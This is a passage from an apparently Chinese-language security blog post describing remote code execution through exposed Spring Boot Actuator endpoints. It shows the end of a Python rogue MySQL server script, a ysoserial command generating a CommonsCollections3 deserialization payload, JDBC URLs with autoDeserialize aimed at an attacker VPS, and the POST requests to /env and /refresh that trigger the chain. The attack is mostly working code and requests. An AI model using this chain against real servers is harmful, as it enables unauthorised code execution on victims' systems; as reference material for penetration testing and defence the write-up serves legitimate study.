class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                server_send(conn, _payload)<br><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">try</span>:<br>            conn.close()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    PORT = <span class="hljs-number">3306</span><br><br>    deserialization_file = <span class="hljs-string">r&#x27;payload.ser&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(deserialization_file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(deserialization_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            deserialization_payload = binascii.b2a_hex(f.read())<br>    <span class="hljs-keyword">else</span>:<br>        deserialization_payload = <span class="hljs-string">&#x27;aced****(your deserialized hex data)&#x27;</span><br><br>    count = <span class="hljs-number">0</span><br>    BUFFER_SIZE = <span class="hljs-number">1024</span><br>    response_ok = <span class="hljs-string">&#x27;0700000200000002000000&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] rogue mysql server Listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT))<br>    server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    server_socks.bind((HOST, PORT))<br>    server_socks.listen(<span class="hljs-number">1</span>)<br><br>    run_mysql_server()<br></code></pre></td></tr></table></figure>

<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword"><code class="language-hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsCollections3 calc > payload.ser<br></code></pre></td></tr></table></figure>



<ol start="2">
<li>设置mysql</li>
</ol>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs crystal"><span class="hljs-symbol">jdbc:</span><span class="hljs-symbol">mysql:</span>/<span class="hljs-regexp">/your-vps-ip:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="hljs-literal">false</span>&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="hljs-literal"><code class="language-hljs crystal"><span class="hljs-symbol">jdbc:</span><span class="hljs-symbol">mysql:</span>/<span class="hljs-regexp">/your-vps-ip:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="hljs-literal">false</span>&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>



<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs crystal"><span class="hljs-symbol">jdbc:</span><span class="hljs-symbol">mysql:</span>/<span class="hljs-regexp">/your-vps-ip:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="hljs-literal">false</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="hljs-literal"><code class="language-hljs crystal"><span class="hljs-symbol">jdbc:</span><span class="hljs-symbol">mysql:</span>/<span class="hljs-regexp">/your-vps-ip:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="hljs-literal">false</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>



<p>spring 1.x</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword"><code class="language-hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>spring.datasource.url=对应属性值<br></code></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs awk">POST <span class="hljs-regexp">/actuator/</span>env<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.datasource.url&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string"><code class="language-hljs awk">POST <span class="hljs-regexp">/actuator/</span>env<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.datasource.url&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">"对应属性值"</span>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>刷新配置</li>
</ol>
<p>spring 1.x</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword"><code class="language-hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type"><code class="language-hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure>

<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/routing-abuse">https://0xn3va.gitbook.io/cheat-sheets/framework/spring/routing-abuse</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html</a></p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>